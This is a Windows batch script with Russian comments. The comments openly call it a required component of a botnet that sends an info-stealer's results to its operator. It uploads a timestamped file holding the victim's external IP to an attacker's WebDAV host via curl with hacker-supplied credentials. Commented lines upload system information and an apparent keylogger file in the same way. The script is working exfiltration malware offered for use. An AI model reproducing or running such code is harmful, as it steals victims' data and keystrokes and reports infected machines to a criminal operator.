@echo on
rem Сценарий Windows, отправляющий результаты работы стайлера хозяину
rem Служит для оффлайн подачи команд хозяина стайлера, когда онлайн доступ не работает.

Rem !!! Обязательная часть ботнета  !!!

set CURDATE=%DATE%
if "%TIME:~0,1%"==" "  GOTO CHECK
set CURTIME=%TIME%
GOTO NEXTOP
:CHECK
set CURTIME=0%TIME:~1,8%
:NEXTOP

set newname2=MyIP-%CURDATE:~8,2%%CURDATE:~3,2%%CURDATE:~0,2%_%CURTIME:~0,2%%CURTIME:~3,2%%CURTIME:~6,2%.txt
move /Y %PUB1%\Util\MyIp.txt %PUB1%\Util\%newname2%

rem Определяем переменные:
rem Основная папка
set Mainfolder=webdav
rem Префикс протокола
set pref=http
rem HTTP Port
set port=80

rem HTTP WebDAV Host
set host=%pref%://%Hacker_host2%:%port%/%MainFolder%/
rem WebDAV User
set user=%Hacker_User%
rem WebDAV Password
set password=%Hacker_Pass%
rem Локальный каталог
set LocalFolder=%PUB1%\Util
 
rem Переходим в каталог сервера

cd /d %LocalFolder%
 

rem Отправка внешнего IP адреса на сервер хозяина
curl --upload-file "%newname2%" -v --user %user%:%password% %host%
set CURDATE=
set CURRTIME=
set newname2=


REM Необязательная часть ботнета

rem curl --upload-file "MySystemInfoCheck.txt" -v --user %user%:%password% %host%
rem curl --upload-file "klavik.txt" -v --user %user%:%password% %host%
